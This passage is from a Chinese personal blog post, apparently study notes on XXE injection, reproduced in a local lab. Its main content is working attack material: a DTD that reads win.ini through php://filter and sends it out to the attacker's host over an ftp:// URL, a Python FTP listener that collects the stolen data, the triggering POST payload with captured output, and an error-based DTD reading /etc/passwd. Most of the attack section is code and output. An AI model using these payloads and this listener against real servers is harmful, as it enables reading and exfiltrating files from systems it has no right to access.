+<p>当我们把这 test.xml 部署好后，然后向存在漏洞的 Web 服务器发送 payload 1 的内容后，<br>我们剩下的就是在 VPS 里，打开 ftp.py 监听 自己设置的特定端口就行了。</p>
+<p>我本地复现了使用 ftp.py 的过程，但是由于我环境的问题还是什么原因，接受的结果都是无法正常获取信息，不过<br>作为笔记，我还是把过程写下来。</p>
+<ol>
+<li>打开虚拟机环境部署上面那个一直用的测试xml的PHP代码（192.168.1.112）</li>
+<li>本机环境下添加 shiyan.xml 内容，并打开 XAMPP 集成环境工具（192.168.1.106）</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">file:///c:/windows/win.ini</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % aaa "&lt;!ENTITY &amp;#37; bbb SYSTEM 'ftp://192.168.1.106:1314/%file;'&gt;"&gt;</span><br><span class="line">%aaa;</span><br><span class="line">%bbb;</span><br></pre></td></tr></table></figure>
+<p>由于在传输信息中，有空格或者有换行的，都无法正常获取的，所以我继续用了 php://filter读取base64编码 这个编码<br>来读取信息，正常实战环境中，好像不用，，，，我看 i春秋 上面的那个就是直接利用 file协议 。</p>
+<ol start="3">
+<li>打开 cmd 运行监听 ftp 的 ftp.py 的脚本，由于我本人对 socket 真心不太会，就懂个开启一个链接，然后设置下端口<br>开始监听，和一些简单的传输，我用的 luan 的 ftp.py 的脚本，下面贴一下核心简版的，毕竟传播 exp 是那个啥的行为。</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,sys</span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">'0.0.0.0'</span>,<span class="number">1314</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'XXE-FTP listening'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	ss, addr = s.accept()</span><br><span class="line">	ss.settimeout(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		data = ss.recv(<span class="number">10240</span>).rstrip(<span class="string">'\r\n'</span>)</span><br><span class="line">		<span class="keyword">if</span> data[:<span class="number">5</span>] == <span class="string">'GET /'</span>:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'HTTP connect from'</span> , <span class="string">':'</span>.join(map(<span class="keyword">lambda</span> x:str(x),addr))</span><br><span class="line">			<span class="keyword">print</span> data</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'\n\n'</span></span><br><span class="line">			ss.send(dtd)</span><br><span class="line">	<span class="keyword">except</span> socket.timeout:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'FTP connect from'</span> , <span class="string">':'</span>.join(map(<span class="keyword">lambda</span> x:str(x),addr))</span><br><span class="line">		ss.settimeout(<span class="literal">None</span>)</span><br><span class="line">		ss.send(<span class="string">'220 web Server\r\n'</span>)</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Data:'</span></span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			data = ss.recv(<span class="number">10240</span>).rstrip(<span class="string">'\r\n'</span>)</span><br><span class="line">			<span class="keyword">if</span> data[:<span class="number">4</span>] == <span class="string">'USER'</span>:</span><br><span class="line">				ss.send(<span class="string">'200 Ok\r\n'</span>)</span><br><span class="line">			<span class="keyword">elif</span> data[:<span class="number">4</span>] == <span class="string">'TYPE'</span>:</span><br><span class="line">				ss.send(<span class="string">'200 Ok\r\n'</span>)</span><br><span class="line">			<span class="keyword">elif</span> data[:<span class="number">4</span>] == <span class="string">'SIZE'</span>:</span><br><span class="line">				ss.send(<span class="string">'200 Ok\r\n'</span>)</span><br><span class="line">			<span class="keyword">elif</span> data[:<span class="number">3</span>] == <span class="string">'CWD'</span>:</span><br><span class="line">				sys.stdout.write(data[<span class="number">4</span>:].rstrip(<span class="string">'/web'</span>))</span><br><span class="line">				<span class="keyword">if</span> <span class="string">'\n'</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">					sys.stdout.write(<span class="string">'/'</span>)</span><br><span class="line">				ss.send(<span class="string">'200 Ok\r\n'</span>)</span><br><span class="line">			<span class="keyword">elif</span> data[:<span class="number">4</span>] == <span class="string">'EPRT'</span>:</span><br><span class="line">				lan_ip = data.split(data[<span class="number">5</span>])[<span class="number">2</span>]</span><br><span class="line">				<span class="keyword">print</span> <span class="string">'\n================================='</span></span><br><span class="line">				<span class="keyword">print</span> <span class="string">'Got IP =&gt;'</span>,lan_ip</span><br><span class="line">				ss.send(<span class="string">'200 Ok\r\n'</span>)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				ss.send(<span class="string">'666 web\r\n'</span>)</span><br><span class="line">				<span class="keyword">print</span> <span class="string">'\nspecial command received:'</span>,data</span><br><span class="line">				<span class="keyword">print</span> <span class="string">'\n\n'</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	ss.close()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>向服务器端发送 payload 1 的内容（POST 192.168.1.112）</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM "http://192.168.1.106/XXE/shiyan.xml"&gt;%remote;]&gt;</span></span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>虽说我的 ftp.py 报错了，但是还是接受到一堆数据。。。（PS：他的这个ftp，要是懂的话，还得再改改，不懂的话，<br>就直接用下面压缩包里 ichunqiu 里的那个 ftp.py 把）</li>
+</ol>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">shiyan</span>&gt;<span class="title">G</span>:/<span class="title">shiyan.py</span></span></span><br><span class="line"><span class="function"><span class="title">XXE</span>-<span class="title">FTP</span> <span class="title">listening</span></span></span><br><span class="line"><span class="function"><span class="title">FTP</span> <span class="title">connect</span> <span class="title">from</span> 192.168.1.112:1165</span></span><br><span class="line"><span class="function"><span class="title">Data</span>:</span></span><br><span class="line"><span class="function">/<span class="title">OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0DQpbZm9udHNdDQpbZXh0ZW5zaW9uc10NClttY2kgZXh0ZW5zaW9uc10NCltmaWxlc10NCltNYWlsXQ0KTUFQST0xDQpbTUNJIEV4dGVuc2lvbnMuQkFLXQ0KYWlmPU1QRUdWaWRlbw0KYWlmYz1NUEVHVmlkZW8NCmFpZmY9TVBFR1ZpZGVvDQphc2Y9TVBFR1ZpZGVvDQphc3g9TVBFR1ZpZGVvDQphdT1NUEVHVmlkZW8NCm0xdj1NUEVHVmlkZW8NCm0zdT1NUEVHVmlkZW8NCm1wMj1NUEVHVmlkZW8NCm1wMnY9TVBFR1ZpZGVvDQptcDM9TVBFR1ZpZGVvDQptcGE9TVBFR1ZpZGVvDQptcGU9TVBFR1ZpZGVvDQptcGVnPU1QRUdWaWRlbw0KbXBnPU1QRUdWaWRlbw0KbXB2Mj1NUEVHVmlkZW8NCnNuZD1NUEVHVmlkZW8NCndheD1NUEVHVmlkZW8NCndtPU1QRUdWaWRlbw0Kd21hPU1QRUdWaWRlbw0Kd212PU1QRUdWaWRlbw0Kd214PU1QRUdWaWRlbw0Kd3BsPU1QRUdWaWRlbw0Kd3Z4PU1QRUdWaWRlbw0K</span>/</span></span><br><span class="line"><span class="function"><span class="title">special</span> <span class="title">command</span> <span class="title">received</span>: <span class="title">MDTM</span> /<span class="title">OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0DQpbZm9udHNdDQpbZXh0ZW5zaW9uc10NClttY2kgZXh0ZW5zaW9uc10NCltmaWxlc10NCltNYWlsXQ0KTUFQST0xDQpbTUNJIEV4dGVuc2lvbnMuQkFLXQ0KYWlmPU1QRUdWaWRlbw0KYWlmYz1NUEVHVmlkZW8NCmFpZmY9TVBFR1ZpZGVvDQphc2Y9TVBFR1ZpZGVvDQphc3g9TVBFR1ZpZGVvDQphdT1NUEVHVmlkZW8NCm0xdj1NUEVHVmlkZW8NCm0zdT1NUEVHVmlkZW8NCm1wMj1NUEVHVmlkZW8NCm1wMnY9TVBFR1ZpZGVvDQptcDM9TVBFR1ZpZGVvDQptcGE9TVBFR1ZpZGVvDQptcGU9TVBFR1ZpZGVvDQptcGVnPU1QRUdWaWRlbw0KbXBnPU1QRUdWaWRlbw0KbXB2Mj1NUEVHVmlkZW8NCnNuZD1NUEVHVmlkZW8NCndheD1NUEVHVmlkZW8NCndtPU1QRUdWaWRlbw0Kd21hPU1QRUdWaWRlbw0Kd212PU1QRUdWaWRlbw0Kd214PU1QRUdWaWRlbw0Kd3BsPU1QRUdWaWRlbw0Kd3Z4PU1QRUdWaWRlbw0K</span></span></span><br><span class="line"><span class="function"><span class="title">FTP</span> <span class="title">connect</span> <span class="title">from</span> 192.168.1.112:1166</span></span><br><span class="line"><span class="function"><span class="title">Data</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">special</span> <span class="title">command</span> <span class="title">received</span>: <span class="title">EPSV</span></span></span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li>由于是报错状态，所以脚本没有正常退出，不过通过 base64解码还是能得到传输的数据</li>
+</ol>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">; for 16-bit app support</span><br><span class="line">[fonts]</span><br><span class="line">[extensions]</span><br><span class="line">[mci extensions]</span><br><span class="line">[files]</span><br><span class="line">[Mail]</span><br><span class="line">MAPI=1</span><br><span class="line">[MCI Extensions.BAK]</span><br></pre></td></tr></table></figure>
+<p>总体来说也就这些东西。</p>
+<p>参考文章：<br><a href="http://www.loner.fm/bugs/bug_detail.php?wybug_id=wooyun-2014-074069" target="_blank" rel="noopener">http://www.loner.fm/bugs/bug_detail.php?wybug_id=wooyun-2014-074069</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a><br><a href="http://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="noopener">http://blog.csdn.net/u011721501/article/details/43775691</a><br><a href="https://www.ichunqiu.com/open/58939" target="_blank" rel="noopener">https://www.ichunqiu.com/open/58939</a><br><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">https://thief.one/2017/06/20/1/</a><br><a href="http://bobao.360.cn/learning/detail/3841.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3841.html</a></p>
+<p>两个 ftp.py （一个是 ichunqiu 的，一个是luan的，ichunqiu 的我应该没看错代码）：</p>
+<p>链接: <a href="https://pan.baidu.com/s/1c8loEq" target="_blank" rel="noopener">https://pan.baidu.com/s/1c8loEq</a> 密码: tq8p</p>
+<p>PS：ftp.py 主要是使用ftp协议，而ftp协议不同于http协议是，http是一次性的数据包，而我们的数据都是在URL中，如果<br>读取的文件中出现空格或者换行就违背了协议，无法传输，所以一开始那个我用的编码来传输，而 ftp 是交互式的，先建立连接<br>然后根据不停的状态码的交互，最后获取到数据，所以空格，换行没什么问题，这也是 ftp.py 里后面我不懂的那些部分代码</p>
+<p>容易存在XXE的地方：<br>1.基于XML的RPC服务 或 基于SOAP的WebService<br>2.开发框架的对Content-Type智能识别导致的XXE<br>3.使用SAML的登录接口<br>4.解析DOCX文件</p>
+<p>强制报错回显：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo SYSTEM "http://xxe.sh1yan.top/shiyan.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">search</span>&gt;</span>name<span class="tag">&lt;/<span class="name">search</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>DTD文档：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">payload</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % paraml '&lt;!ENTITY % external SYSTEM "file:///nothere/%payload;"&gt;'&gt;</span><br><span class="line">%paraml;</span><br><span class="line">%external;</span><br></pre></td></tr></table></figure>
+
+      
+      
+        
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="sh1yan.top/2018/09/15/xxe-study/" data-id="cl64hepgl004pasw1x6bsnxyw" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XXE/">XXE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web漏洞/">web漏洞</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-about" class="widget-title">About</h3>
+    <div class="widget">
+
+<!-- 优美的分割线 -->
+
+    <div style="width:249px;height:190px;border:1px none ;text-align:center">
+  <img src="//sh1yan.top/icon.png" alt="shiyan" style="width:190px;height:190px;display:inline-block;margin:0 auto">
+  </div>
+<br>
+
+
+<p style="font-size:15px">ID：shiyan</p>
+<p style="font-size:14px">个人简介：会开挖挖机的园工~</p>
+<p style="font-size:14px">
+<a href="mailto:506130869@qq.com">Email：506130869@qq.com</a><br>
+<a href="https://github.com/shiyan-520">GitHub：https://github.com/shiyan-520</a>
+</p>
+
+
+<!-- 优美的分割线 -->
+
+      
+      
+      <p></p>
+      
+      
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-tagcloud" class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/ByPass-UAC/" style="font-size: 10px;">ByPass-UAC</a> <a href="/tags/CMS/" style="font-size: 13.33px;">CMS</a> <a href="/tags/COM组件劫持/" style="font-size: 10px;">COM组件劫持</a> <a href="/tags/Cobalt-Strike/" style="font-size: 10px;">Cobalt Strike</a> <a href="/tags/DLL劫持/" style="font-size: 10px;">DLL劫持</a> <a href="/tags/Excel/" style="font-size: 13.33px;">Excel</a> <a href="/tags/JavaWeb/" style="font-size: 20px;">JavaWeb</a> <a href="/tags/Kerberos认证/" style="font-size: 10px;">Kerberos认证</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/PHP/" style="font-size: 13.33px;">PHP</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Python3/" style="font-size: 10px;">Python3</a> <a href="/tags/Rmi协议/" style="font-size: 10px;">Rmi协议</a> <a href="/tags/SMBMS/" style="font-size: 10px;">SMBMS</a> <a href="/tags/UAC/" style="font-size: 10px;">UAC</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/access-token/" style="font-size: 10px;">access token</a> <a href="/tags/burp/" style="font-size: 16.67px;">burp</a> <a href="/tags/hash/" style="font-size: 10px;">hash</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/jsonp/" style="font-size: 10px;">jsonp</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/mybatis/" style="font-size: 10px;">mybatis</a> <a href="/tags/mysql/" style="font-size: 13.33px;">mysql</a> <a href="/tags/pandas/" style="font-size: 10px;">pandas</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/spring5/" style="font-size: 10px;">spring5</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/vba/" style="font-size: 13.33px;">vba</a> <a href="/tags/web漏洞/" style="font-size: 13.33px;">web漏洞</a> <a href="/tags/令牌伪造/" style="font-size: 10px;">令牌伪造</a> <a href="/tags/动态代理/" style="font-size: 10px;">动态代理</a> <a href="/tags/博客源码/" style="font-size: 10px;">博客源码</a> <a href="/tags/博客问题解决/" style="font-size: 10px;">博客问题解决</a> <a href="/tags/反射/" style="font-size: 10px;">反射</a> <a href="/tags/域渗透/" style="font-size: 10px;">域渗透</a> <a href="/tags/学习笔记/" style="font-size: 16.67px;">学习笔记</a> <a href="/tags/安全审计/" style="font-size: 13.33px;">安全审计</a> <a href="/tags/安全服务/" style="font-size: 10px;">安全服务</a> <a href="/tags/工具分析/" style="font-size: 10px;">工具分析</a> <a href="/tags/序列化/" style="font-size: 10px;">序列化</a> <a href="/tags/报错注入/" style="font-size: 10px;">报错注入</a> <a href="/tags/漏洞复现/" style="font-size: 10px;">漏洞复现</a> <a href="/tags/生活记录/" style="font-size: 10px;">生活记录</a> <a href="/tags/端口转发/" style="font-size: 10px;">端口转发</a> <a href="/tags/脚本编写/" style="font-size: 10px;">脚本编写</a> <a href="/tags/部署上线/" style="font-size: 10px;">部署上线</a>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-recent-posts" class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/03/20/Mybatis-3-learning-notes/">mybatis-3学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/02/Spring-5-learning-notes/">Spring5学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/18/An-audit-of-Java-Web-smbms/">记一次对JavaWeb-SMBMS的审计</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/18/Java-RMI-protocol-learning/">Java Rmi协议学习</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/13/Java-Dynamic-agent-mode/">Java动态代理模式</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+    不要因为走了太久而忘记当初为什么出发。
+    <br>
+    Copyrights &copy; 2022 shiyan All Rights Reserved. 
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_uv"> 
+    <a>「</a>本站访客数<span id="busuanzi_value_site_uv"></span>人次<a>」</a>
+    </span></div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/gossip" class="mobile-nav-link">Gossip</a>
+  
+    <a href="/yqlj" class="mobile-nav-link">Links</a>
+  
+</nav>
+
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/ja_JP/sdk.js#xfbml=1&version=v2.4";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+<script src="/js/script.js"></script>
+
+
+  </div>
+</body>
+</html>
